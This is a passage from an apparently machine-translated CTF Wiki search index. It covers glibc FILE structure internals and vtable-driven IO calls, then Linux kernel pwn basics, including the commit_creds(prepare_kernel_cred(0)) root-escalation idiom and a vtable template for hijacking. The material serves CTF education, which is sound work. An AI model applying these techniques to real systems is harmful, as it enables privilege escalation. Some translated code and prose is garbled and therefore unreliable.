that these three file streams are located in the data segment of libc.so. The file stream we created with fopen is allocated on the heap memory. We can find stdin\\stdout\\stderr and other symbols in libc.so, these symbols are pointers to the FILE structure, the symbol of the real structure is _IO_2_1_stderr_ _IO_2_1_stdout_ _IO_2_1_stdin_ But in fact the _IO_FILE structure is wrapped around another structure _IO_FILE_plus, which contains an important pointer vtable pointing to a series of function pointers. In libc2.23, the 32-bit vtable offset is 0x94 and the 64-bit offset is 0xd8. struct _IO_FILE_plus { _IO_FILE file; IO_jump_t *vtable; } Vtable is a pointer of type IO_jump_t, and some function pointers are stored in IO_jump_t. Later we will see that these function pointers are called in a series of standard IO functions. void * funcs[] = { 1 NULL, // \"extra word\" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf 9 NULL, // xsgetn 10 NULL, // seekoff 11 NULL, // seekpos 12 NULL, // setbuf 13 NULL, // sync 14 NULL, // target location 15 NULL, // read 16 NULL, // write 17 NULL, // seek 18 pwn, // close 19 NULL, // stat 20 NULL, // showmanyc 21 NULL, // imbue }; fread \u00b6 Fread is a standard IO library function that reads data from a file stream. The function prototype is as follows size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ; buffer Holds the buffer for reading data. size: specifies the length of each record. count: Specifies the number of records. stream: the target file stream. Return value: Returns the number of records read into the data buffer The code for fread is located in /libio/iofread.c and the function name is _IO_fread, but the real function is implemented in the subfunction _IO_sgetn. _IO_size_t _IO_fread (buf, size, count, fp) void *buf; _IO_size_t size; _IO_size_t count; _IO_FILE * fp; { ... bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested); ... } _IO_XSGETN is called in the _IO_sgetn function, and _IO_XSGETN is a function pointer in _IO_FILE_plus.vtable. When this function is called, the pointer in the vtable is first fetched and then called. _IO_size_t _IO_sgetn (fp, date, n) _IO_FILE * fp; void *data; _IO_size_t n; { return _IO_XSGETN (fp, data, n); } By default the function pointer points to the _IO_file_xsgetn function. if (fp->_IO_buf_base && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base)) { if (__underflow (fp) == EOF) break; continue; } fwrite \u00b6 Fwrite is also a standard IO library function, the function is to write data to the file stream, the function prototype is as follows size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream); buffer: is a pointer, for fwrite, is the address to write data; size: the number of single bytes to write to the content; count: the number of data items to be written to size bytes; stream: target file pointer; Return value: count of the number of data items actually written. The code for fwrite is located in /libio/iofwrite.c and the function name is _IO_fwrite. In _IO_fwrite, _IO_XSPUTN is mainly called to implement the write function. According to the introduction of _IO_FILE_plus, it can be seen that _IO_XSPUTN is located in the vtable of _IO_FILE_plus. To call this function, you need to first take out the pointer in the vtable and then jump over to make the call. written = _IO_sputn (fp, (const char *) buf, request); The _IO_OVERFLOW, also located in the vtable, is called in the default function _IO_new_file_xsputn corresponding to _IO_XSPUTN. /* Next flush the (full) buffer. */ if (_IO_OVERFLOW (f, EOF) == EOF) The default function of _IO_OVERFLOW is _IO_new_file_overflow if (ch == EOF) return _IO_do_write (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base); if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; The system interface write function will eventually be called inside _IO_new_file_overflow. fopen \u00b6 Fopen is used to open files in the standard IO library. The function prototype is as follows FILE *fopen(char *filename, *type); filename: the path to the target file type: type of open method Return value: return a file pointer Inside the fopen will create a FILE structure and perform some initialization operations, let's take a look at this process First, the malloc function is called inside the fopen corresponding function __fopen_internal, and the space of the FILE structure is allocated. So we can know that the FILE structure is stored on the heap. *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE)); After that, the vtable will be initialized for the created FILE, and _IO_file_init will be called to further initialize the operation. _IO_JUMPS (&new_f->fp) = &_IO_file_jumps; _IO_file_init (&new_f->fp); In the initialization operation of the _IO_file_init function, _IO_link_in is called to link the newly allocated FILE into _IO_list_all as the starting FILE list. void _IO_link_in (fp) struct _IO_FILE_plus *fp; { if ((fp->file._flags & _IO_LINKED) == 0) { fp->file._flags |= _IO_LINKED; fp-&gt; file._chain = (_IO_FILE *) _IO_list_all; _IO_list_all = fp; ++_IO_list_all_stamp; } } After that, the __fopen_internal function will call the _IO_file_fopen function to open the target file. _IO_file_fopen will open according to the open mode passed by the user. In the end, it will call the system interface open function, which is not deepened here. if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL) return __fopen_maybe_mmap (&new_f->fp.file); Summarize the operation of fopen is Use malloc to allocate FILE structure Set the vtable of the FILE structure Initialize the allocated FILE structure Link the initialized FILE structure into the FILE structure list Call system call to open file fclose \u00b6 Fclose is a function in the standard IO library for closing open files, which is the opposite of fopen. int fclose(FILE *stream) Function: Close a file stream, use fclose to output the last remaining data in the buffer to the disk file, and release the file pointer and related buffer Fclose will first call _IO_unlink_it to delink the specified FILE from the _chain list. if (fp->_IO_file_flags & _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); After that, the _IO_file_close_it function will be called, and _IO_file_close_it will call the system interface close to close the file. if (fp->_IO_file_flags & _IO_IS_FILEBUF) status = _IO_file_close_it (fp); Finally, the _IO_FINISH in the vtable is called, which corresponds to the _IO_file_finish function, which will call the free function to release the previously allocated FILE structure. _IO_FINISH (fp); printf/puts \u00b6 Printf and puts are commonly used output functions. When the printf argument is a pure string ending with '\\n', printf will be optimized to puts the function and remove the newline. The function that puts implements in the source code is _IO_puts. The operation of this function is roughly the same as that of fwrite. The function also calls _IO_sputn in the vtable. The result is _IO_new_file_xsputn, and finally the system interface write function is called. Printf's call stack traceback is as follows, also implemented by _IO_file_xsputn vfprintf+11 _IO_file_xsputn _IO_file_overflow funlockfile _IO_file_write write","title":"FILE Structure Description"},{"location":"pwn/linux/io_file/introduction/#file","text":"","title":"FILE\u7ed3\u6784"},{"location":"pwn/linux/io_file/introduction/#file-introduction","text":"FILE is a structure for describing files in a standard IO library of a Linux system, called a file stream. The FILE structure is created when the program executes functions such as fopen and is allocated in the heap. We often define a pointer to the FILE structure to receive this return value. The FILE structure is defined in libio.h as shown below struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ #define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; #if 0 int _blksize; #else int _flags2; #endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */ #define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock; #ifdef _IO_USE_OLD_IO_FILE }; The FILE structure in the process will be connected to each other through the _chain field to form a linked list. The linked list header is represented by the global variable _IO_list_all. Through this value, we can traverse all the FILE structures. In the standard I/O library, three file streams are automatically opened at the start of each program: stdin, stdout, stderr. So in the initial state, _IO_list_all points to a linked list of these file streams, but it should be noted that these three file streams are located in the data segment of libc.so. The file stream we created with fopen is allocated on the heap memory. We can find stdin\\stdout\\stderr and other symbols in libc.so, these symbols are pointers to the FILE structure, the symbol of the real structure is _IO_2_1_stderr_ _IO_2_1_stdout_ _IO_2_1_stdin_ But in fact the _IO_FILE structure is wrapped around another structure _IO_FILE_plus, which contains an important pointer vtable pointing to a series of function pointers. In libc2.23, the 32-bit vtable offset is 0x94 and the 64-bit offset is 0xd8. struct _IO_FILE_plus { _IO_FILE file; IO_jump_t *vtable; } Vtable is a pointer of type IO_jump_t, and some function pointers are stored in IO_jump_t. Later we will see that these function pointers are called in a series of standard IO functions. void * funcs[] = { 1 NULL, // \"extra word\" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf 9 NULL, // xsgetn 10 NULL, // seekoff 11 NULL, // seekpos 12 NULL, // setbuf 13 NULL, // sync 14 NULL, // target location 15 NULL, // read 16 NULL, // write 17 NULL, // seek 18 pwn, // close 19 NULL, // stat 20 NULL, // showmanyc 21 NULL, // imbue };","title":"FILE Introduction"},{"location":"pwn/linux/io_file/introduction/#fread","text":"Fread is a standard IO library function that reads data from a file stream. The function prototype is as follows size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ; buffer Holds the buffer for reading data. size: specifies the length of each record. count: Specifies the number of records. stream: the target file stream. Return value: Returns the number of records read into the data buffer The code for fread is located in /libio/iofread.c and the function name is _IO_fread, but the real function is implemented in the subfunction _IO_sgetn. _IO_size_t _IO_fread (buf, size, count, fp) void *buf; _IO_size_t size; _IO_size_t count; _IO_FILE * fp; { ... bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested); ... } _IO_XSGETN is called in the _IO_sgetn function, and _IO_XSGETN is a function pointer in _IO_FILE_plus.vtable. When this function is called, the pointer in the vtable is first fetched and then called. _IO_size_t _IO_sgetn (fp, date, n) _IO_FILE * fp; void *data; _IO_size_t n; { return _IO_XSGETN (fp, data, n); } By default the function pointer points to the _IO_file_xsgetn function. if (fp->_IO_buf_base && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base)) { if (__underflow (fp) == EOF) break; continue; }","title":"fread"},{"location":"pwn/linux/io_file/introduction/#fwrite","text":"Fwrite is also a standard IO library function, the function is to write data to the file stream, the function prototype is as follows size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream); buffer: is a pointer, for fwrite, is the address to write data; size: the number of single bytes to write to the content; count: the number of data items to be written to size bytes; stream: target file pointer; Return value: count of the number of data items actually written. The code for fwrite is located in /libio/iofwrite.c and the function name is _IO_fwrite. In _IO_fwrite, _IO_XSPUTN is mainly called to implement the write function. According to the introduction of _IO_FILE_plus, it can be seen that _IO_XSPUTN is located in the vtable of _IO_FILE_plus. To call this function, you need to first take out the pointer in the vtable and then jump over to make the call. written = _IO_sputn (fp, (const char *) buf, request); The _IO_OVERFLOW, also located in the vtable, is called in the default function _IO_new_file_xsputn corresponding to _IO_XSPUTN. /* Next flush the (full) buffer. */ if (_IO_OVERFLOW (f, EOF) == EOF) The default function of _IO_OVERFLOW is _IO_new_file_overflow if (ch == EOF) return _IO_do_write (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base); if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; The system interface write function will eventually be called inside _IO_new_file_overflow.","title":"fwrite"},{"location":"pwn/linux/io_file/introduction/#fopen","text":"Fopen is used to open files in the standard IO library. The function prototype is as follows FILE *fopen(char *filename, *type); filename: the path to the target file type: type of open method Return value: return a file pointer Inside the fopen will create a FILE structure and perform some initialization operations, let's take a look at this process First, the malloc function is called inside the fopen corresponding function __fopen_internal, and the space of the FILE structure is allocated. So we can know that the FILE structure is stored on the heap. *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE)); After that, the vtable will be initialized for the created FILE, and _IO_file_init will be called to further initialize the operation. _IO_JUMPS (&new_f->fp) = &_IO_file_jumps; _IO_file_init (&new_f->fp); In the initialization operation of the _IO_file_init function, _IO_link_in is called to link the newly allocated FILE into _IO_list_all as the starting FILE list. void _IO_link_in (fp) struct _IO_FILE_plus *fp; { if ((fp->file._flags & _IO_LINKED) == 0) { fp->file._flags |= _IO_LINKED; fp-&gt; file._chain = (_IO_FILE *) _IO_list_all; _IO_list_all = fp; ++_IO_list_all_stamp; } } After that, the __fopen_internal function will call the _IO_file_fopen function to open the target file. _IO_file_fopen will open according to the open mode passed by the user. In the end, it will call the system interface open function, which is not deepened here. if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL) return __fopen_maybe_mmap (&new_f->fp.file); Summarize the operation of fopen is Use malloc to allocate FILE structure Set the vtable of the FILE structure Initialize the allocated FILE structure Link the initialized FILE structure into the FILE structure list Call system call to open file","title":"fopen"},{"location":"pwn/linux/io_file/introduction/#fclose","text":"Fclose is a function in the standard IO library for closing open files, which is the opposite of fopen. int fclose(FILE *stream) Function: Close a file stream, use fclose to output the last remaining data in the buffer to the disk file, and release the file pointer and related buffer Fclose will first call _IO_unlink_it to delink the specified FILE from the _chain list. if (fp->_IO_file_flags & _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); After that, the _IO_file_close_it function will be called, and _IO_file_close_it will call the system interface close to close the file. if (fp->_IO_file_flags & _IO_IS_FILEBUF) status = _IO_file_close_it (fp); Finally, the _IO_FINISH in the vtable is called, which corresponds to the _IO_file_finish function, which will call the free function to release the previously allocated FILE structure. _IO_FINISH (fp);","title":"fclose"},{"location":"pwn/linux/io_file/introduction/#printfputs","text":"Printf and puts are commonly used output functions. When the printf argument is a pure string ending with '\\n', printf will be optimized to puts the function and remove the newline. The function that puts implements in the source code is _IO_puts. The operation of this function is roughly the same as that of fwrite. The function also calls _IO_sputn in the vtable. The result is _IO_new_file_xsputn, and finally the system interface write function is called. Printf's call stack traceback is as follows, also implemented by _IO_file_xsputn vfprintf+11 _IO_file_xsputn _IO_file_overflow funlockfile _IO_file_write write","title":"printf/puts"},{"location":"pwn/linux/kernel/basic_knowledge/","text":"Introduce some basic knowledge that Linux kernel pwn will use, and will gradually add it later. Mainly refer to [Linux Kernel Exploitation] ( https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/kernel/ref/13_lecture.pdf ). Kernel \u00b6 The kernel is also a program that manages the data I/O requirements issued by the software, escaping these requirements into instructions, and handing them over to the CPU and other components in the computer. The kernel is the most basic part of modern operating systems. The main function of the kernel is twofold: Control and interact with the hardware Provide an environment in which the application can run Various functions including I/O, permission control, system call, process management, memory management, etc. can be attributed to the above two points. It should be noted that the kernel crash usually causes a reboot . Ring Model \u00b6 The intel CPU divides the privilege level of the CPU into four levels: Ring 0, Ring 1, Ring 2, Ring 3. Ring0 is only used by the OS. All Ring 3 programs can be used. The inner ring can use the resources of the outer ring. The Ring Model is used to improve system security. For example, a spyware as a user program running on Ring 3 will be blocked when the user is not notified, because the access hardware needs to use the Ring 1 reserved by the being driver. method. Most modern operating systems use only Ring 0 and Ring 3. Loadable Kernel Modules(LKMs) \u00b6 Loadable core modules (or directly called kernel modules) are like executable programs running in kernel space, including: Drivers device driver File system driver ... kernel extension modules (modules) The file format of LKMs is the same as that of user mode. ELF under Linux, exe/dll under Windows, and MACH-O under mac, so we can use IDA and other tools to analyze kernel modules. Modules can be compiled separately, but not separately. It is linked to the kernel as part of the kernel at run time, running in kernel space, unlike processes running on user controls. Modules are often used to implement a file system, a driver, or other kernel-level functionality. > The Linux kernel provides a modular mechanism because it is itself a monolithic kernel. The advantage of a single core is that it is efficient because all the content is brought together, but the disadvantage is that the scalability and maintainability are relatively poor, and the module mechanism is to make up for this defect. Related Instructions \u00b6 insmod : Load the specified module into the kernel rmmod : Unload the specified module from the kernel lsmod : List the modules that have been loaded > Most kernel vulnerability is also in LKM. syscall \u00b6 A system call is a program in which user space requests a service that requires higher privileges from the operating system kernel, such as IO operations or interprocess communication. The system call provides an interface between the user program and the operating system. Some library functions (such as scanf, puts, etc. IO related functions are actually the encapsulation (read and write) of the system call). > View 64-bit and 32-bit system calls in /usr/include/x86_64-linux-gnu/asm/unistd_64.h and /usr/include/x86_64-linux-gnu/asm/unistd_32.h respectively number. > Also recommend a very useful website [Linux Syscall Reference] ( https://syscalls.kernelgrok.com ), you can refer to the register meaning and source code of the 32-bit system call. Teachers are welcome to recommend 64-bit similar features. ioctl \u00b6 Directly view the man page NAME ioctl - control device SYNOPSIS #include <sys/ioctl.h> int ioctl(int fd, unsigned long request, ...); DESCRIPTION The ioctl() system call manipulates the underlying device parameters of special files. In particular, many operating characteristics of character special files (e.g., terminals) may be controlled with ioctl() requests. The argument fd must be an open file descriptor. The second argument is a device-dependent request code. The third argument is an untyped pointer to memory. It's traditionally char *argp (from the days before void * was valid C), and will be so named for this discussion. An ioctl() request has encoded in it whether the argument is an in parameter or out parameter, and the size of the argument argp in bytes. Macros and defines used in specifying an ioctl() request are located in the file <sys/ioctl.h>. It can be seen that ioctl is also a system call for communicating with devices. The first argument to int ioctl(int fd, unsigned long request, ...) is the [file descriptor] returned by the open device (open) ( http://m4x.fun/post/play-with-file -descriptor-1/), the second parameter is the user program's control command for the device, and the latter parameter is some supplementary parameter, which is related to the device. > Reasons for communicating with ioctl: > The operating system provides kernel access to system calls to standard external devices, as most hardware devices can only be addressed directly within kernel space, but when accessing non-standard hardware devices these system calls are not appropriate, and sometimes user mode may need to be directly Access the device. > For example, a system administrator might want to modify the configuration of the NIC. Modern operating systems provide support for a wide variety of devices, and some devices may not be considered by the kernel designer, thus making it impossible to provide such a system call to use the device. > To solve this problem, the kernel is designed to be extensible, and a module called device driver can be added. The driver code allows it to run in kernel space and directly address the device. An Ioctl interface is a separate system call through which user space can communicate with device drivers. The device-driven request is an Ioctl call with the device and request number as parameters, so the kernel allows user space to access the device driver and access the device without knowing the specific device details, and does not require a lot of different devices. System call. Status Switch \u00b6 user space to kernel space \u00b6 When a 'system call', generate exception , peripheral generate interrupt , etc. event occurs, the user mode to kernel mode switch occurs. The specific process is: Switch the GS segment register with swapgs to exchange the GS register value with the value of a specific location. The purpose is to save the GS value and use the value of this location as the GS value when the kernel is executed. Record the current top of the stack (the top of the user space stack) in the CPU exclusive variable area, and put the top of the kernel stack recorded in the CPU exclusive area into rsp/esp. Save each register value by push. The specific [code] ( http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S ) is as follows: ` asm \u200b ENTRY(entry_SYSCALL_64) / SWAPGS_UNSAFE_STACK is a macro, x86 is directly defined as the swapgs command / \u200b SWAPGS_UNSAFE_STACK \u200b / Save the stack value and set the kernel stack / \u200b movq %rsp, PER_CPU_VAR(rsp_scratch) movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp \u200b \u200b / Save the register value by push to form a pt_regs structure / \u200b / Construct struct pt_regs on stack / pushq $__USER_DS /* pt_regs->ss */ pushq PER_CPU_VAR(rsp_scratch) /* pt_regs->sp */ pushq %r11 /* pt_regs->flags */ pushq $__USER_CS /* pt_regs->cs */ pushq %rcx /* pt_regs->ip */ pushq %rax /* pt_regs->orig_ax */ pushq% rdi / * pt_regs-> at * / pushq% rsi / * pt_regs-> and * / \u200b pushq %rdx / pt_regs->dx / Pushq %rcx tuichu / pt_regs->cx / \u200b pushq $-ENOSYS / pt_regs->ax / pushq %r8 /* pt_regs->r8 */ pushq% r9 / * pt_regs-> r9 * / \u200b pushq %r10 / pt_regs->r10 / pushq %r11 /* pt_regs->r11 */ sub $(6*8), %rsp /* pt_regs->bp, bx, r12-15 not saved */ ``` Determine if it is x32_abi by the assembly instruction. Continue to execute the system call by jumping to the corresponding location of the global variable sys_call_table by the system call number. kernel space to user space \u00b6 When exiting, the process is as follows: Restore GS value by swapgs Resume to the user control via sysretq or iretq to continue execution. If you use iretq you also need to give some information about the user space (CS, eflags/rflags, esp/rsp, etc.) structure I think \u00b6 As mentioned before, the kernel records the permissions of the process. More specifically, it is recorded by the cred structure. Each process has a cred structure. This structure saves the permissions of the process (uid, gid, etc.). Can modify the cred of a process, then modify the permissions of this process. [source code] ( https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred ) as follows: ` asm struct cred { \u200b atomic_t usage; ifdef CONFIG_DEBUG_CREDENTIALS \u00b6 atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic; define CRED_MAGIC 0x43736564 \u00b6 define CRED_MAGIC_DEAD 0x44656144 \u00b6 endif \u00b6 \u200b kuid_t uid; / real UID of the task / kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ but_t fsuid; / * UID for VFS ops * / \u200b kgid_t fsgid; / GID for VFS ops / unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we're permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */ kernel_cap_t cap_ambient; /* Ambient capability set */ ifdef CONFIG_KEYS \u00b6 unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key __rcu *session_keyring; /* keyring inherited over fork */ struct key *process_keyring; /* keyring private to this process */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */ endif \u00b6 ifdef CONFIG_SECURITY \u00b6 void *security; /* subjective LSM security */ endif \u00b6 \u200b struct user_struct user; / real user ID subscription */ struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */ } __randomize_layout; ## Kernel state function Kernel state functions have some changes compared to user state library functions - printf() -&gt; **printk()**, but note that printk() does not necessarily display the content on the terminal, but it must be in the kernel buffer. You can view the effect via `dmesg` - memcpy() -> **copy\\_from\\_user()/copy\\_to\\_user()** - copy\\_from\\_user() implements transferring user space data to kernel space - copy\\_to\\_user() implements transferring kernel space data to user space - malloc() -&gt; **kmalloc()**, kernel-mode memory allocation function, similar to malloc(), but using the `slab/slub allocator` - free() -> **kfree()**\uff0c\u540c kmalloc() Also note that the `kernel manages the process, so the kernel also records the permissions of the process`. There are two functions in the kernel that can easily change permissions: - **int commit_creds(struct cred \\*new)** - **struct cred\\* prepare_kernel_cred(struct task_struct\\* daemon)** As you can see from the function name, execute `commit_creds(prepare_kernel_cred(0))` to get root privileges (root&#39;s uid, gid is 0) Executing `commit_creds(prepare_kernel_cred(0))` is also the most commonly used method of lifting. The addresses of both functions can be viewed in `/proc/kallsyms` (the older kernel version is `/proc/ksyms`. \u200b```bash post sudo grep commit_creds /proc/kallsyms [sudo] m4x password: ffffffffbb6af9e0 T commit_creds ffffffffbc7cb3d0 r __ksymtab_commit_creds ffffffffbc7f06fe r __kstrtab_commit_creds post sudo grep prepare_kernel_cred /proc/kallsyms ffffffffbb6afd90 T prepare_kernel_cred ffffffffbc7d4f20 r __ksymtab_prepare_kernel_cred ffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred > In general, the contents of /proc/kallsyms require root privileges to view Mitigation \u00b6 > canary, dep, PIE, RELRO and other protections are the same as user principles smep: Supervisor Mode Execution Protection, when the processor is in ring0 mode, executing the userspace code will trigger a page fault. (This protection is called PXN in arm) smap: Superivisor Mode Access Protection, similar to smep, usually when accessing data. mmap_min_addr: CTF kernel pwn Related \u00b6 Generally given the following three documents boot.sh: a script for starting the shell of the kernel, mostly using qemu, the protection measures are related to the different startup parameters of qemu bzImage: kernel binary rootfs.cpio: file system image such as: \u200b ```bash CISCN2017_babydriver [master]] ls babydriver.tar CISCN2017_babydriver [master \u25cf] x baby driver.tar \u200b boot.sh bzImage rootfs.cpio CISCN2017_babydriver [master]] ls \u200b babydriver.tar boot.sh bzImage rootfs.cpio CISCN2017_babydriver [master\u25cf] file bzImage bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA CISCN2017_babydriver [master\u25cf] file rootfs.cpio rootfs.cpio: gzip compressed data, last modified: Tue Jul 4 08:39:15 2017, max compression, from Unix, original size 2844672 CISCN2017_babydriver [master\u25cf] file boot.sh boot.sh: Bourne-Again shell script, ASCII text executable CISCN2017_babydriver [master \u25cf] bat boot.sh \u200b \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 File: boot.sh \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 1 \u2502 #!/bin/bash 2 \u2502 3 \u2502 qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 ro \u2502 ot=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographi \u2502 c -smp cores=1,threads=1 -cpu kvm64,+smep \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 ``` Explain the parameters that qemu starts: \u200b -initrd rootfs.cpio, using rootfs.cpio as the kernel-initiated file system -kernel bzImage, using bzImage as the kernel image -cpu kvm64, +smep, set the security options for the CPU, here smep is enabled -m 64M, set the virtual RAM to 64M, the default is 128M Other options can be viewed with --help. After writing the exploit locally, you can save the compiled binary file to the remote directory by base64 encoding, etc., and then get the flag. Reference: \u00b6 Https://en.wikipedia.org/wiki/kernel https://en.wikipedia.org/wiki/Classified protection domain https://zh.wikipedia.org/wiki/Ioctl http://www.freebuf.com/articles/system/54263.html https://blog.csdn.net/zqixiao_09/article/details/50839042 https://yq.aliyun.com/articles/53679","title":"Basics"},{"location":"pwn/linux/kernel/basic_knowledge/#kernel","text":"The kernel is also a program that manages the data I/O requirements issued by the software, escaping these requirements into instructions, and handing them over to the CPU and other components in the computer. The kernel is the most basic part of modern operating systems. The main function of the kernel is twofold: Control and interact with the hardware Provide an environment in which the application can run Various functions including I/O, permission control, system call, process management, memory management, etc. can be attributed to the above two points. It should be noted that the kernel crash usually causes a reboot .","title":"Kernel"},{"location":"pwn/linux/kernel/basic_knowledge/#ring-model","text":"The intel CPU divides the privilege level of the CPU into four levels: Ring 0, Ring 1, Ring 2, Ring 3. Ring0 is only used by the OS. All Ring 3 programs can be used. The inner ring can use the resources of the outer ring. The Ring Model is used to improve system security. For example, a spyware as a user program running on Ring 3 will be blocked when the user is not notified, because the access hardware needs to use the Ring 1 reserved by the being driver. method. Most modern operating systems use only Ring 0 and Ring 3.","title":"Ring Model"},{"location":"pwn/linux/kernel/basic_knowledge/#loadable-kernel-moduleslkms","text":"Loadable core modules (or directly called kernel modules) are like executable programs running in kernel space, including: Drivers device driver File system driver ... kernel extension modules (modules) The file format of LKMs is the same as that of user mode. ELF under Linux, exe/dll under Windows, and MACH-O under mac, so we can use IDA and other tools to analyze kernel modules. Modules can be compiled separately, but not separately. It is linked to the kernel as part of the kernel at run time, running in kernel space, unlike processes running on user controls. Modules are often used to implement a file system, a driver, or other kernel-level functionality. > The Linux kernel provides a modular mechanism because it is itself a monolithic kernel. The advantage of a single core is that it is efficient because all the content is brought together, but the disadvantage is that the scalability and maintainability are relatively poor, and the module mechanism is to make up for this defect.","title":"Loadable Kernel Modules(LKMs)"},{"location":"pwn/linux/kernel/basic_knowledge/#related-instructions","text":"insmod : Load the specified module into the kernel rmmod : Unload the specified module from the kernel lsmod : List the modules that have been loaded > Most kernel vulnerability is also in LKM.","title":"Related Instructions"},{"location":"pwn/linux/kernel/basic_knowledge/#syscall","text":"A system call is a program in which user space requests a service that requires higher privileges from the operating system kernel, such as IO operations or interprocess communication. The system call provides an interface between the user program and the operating system. Some library functions (such as scanf, puts, etc. IO related functions are actually the encapsulation (read and write) of the system call). > View 64-bit and 32-bit system calls in /usr/include/x86_64-linux-gnu/asm/unistd_64.h and /usr/include/x86_64-linux-gnu/asm/unistd_32.h respectively number. > Also recommend a very useful website [Linux Syscall Reference] ( https://syscalls.kernelgrok.com ), you can refer to the register meaning and source code of the 32-bit system call. Teachers are welcome to recommend 64-bit similar 